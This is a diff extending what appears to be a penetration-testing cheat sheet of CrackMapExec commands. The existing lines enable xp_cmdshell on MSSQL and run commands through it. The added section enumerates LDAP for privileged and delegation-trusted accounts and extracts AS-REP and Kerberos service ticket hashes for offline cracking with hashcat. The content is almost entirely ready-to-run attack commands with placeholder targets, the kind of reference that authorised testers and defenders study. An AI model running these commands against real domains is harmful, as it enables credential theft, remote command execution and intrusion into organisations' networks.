@@ -36,3 +36,23 @@ cme smb <ip> --local-auth -u <user> -p <pwdlst>
 # Enable the xp_cmdshell on the target MSSQL
 cme mssql <target> --local-auth -u <user> -p <pass> -q 'EXEC sp_configure "show advanced options", 1;RECONFIGURE;exec SP_CONFIGURE "xp_cmdshell", 1;RECONFIGURE'
 cme mssql <target> --local-auth -u <user> -p <pass> -q 'EXEC xp_cmdshell "whoami"'
+
+% ldap
+
+# Test ldap connection
+cme ldap -u <user> -p <password> -d <domain> --kdcHost <ip> <ip>
+
+#  Get objets that had the value adminCount=1
+cme ldap -u <user> -p <password> -d <domain> --kdcHost <ip> --admin-count <ip>
+
+# Get the list of users and computers with flag TRUSTED_FOR_DELEGATION
+cme ldap -u <user> -p <password> -d <domain> --kdcHost <ip> --trusted-for-delegation <ip>
+
+# Get AS_REP response ready to crack with hashcat
+cme ldap -u <user> -p <password> -d <domain> --kdcHost <ip> --asreproast asreproast.output <ip>
+
+# Get TGS ticket ready to crack with hashcat (watchout for clock skew)
+cme ldap -u <user> -p <password> -d <domain> --kdcHost <ip> --kerberoasting kerberoasting.output <ip>
+
+
+
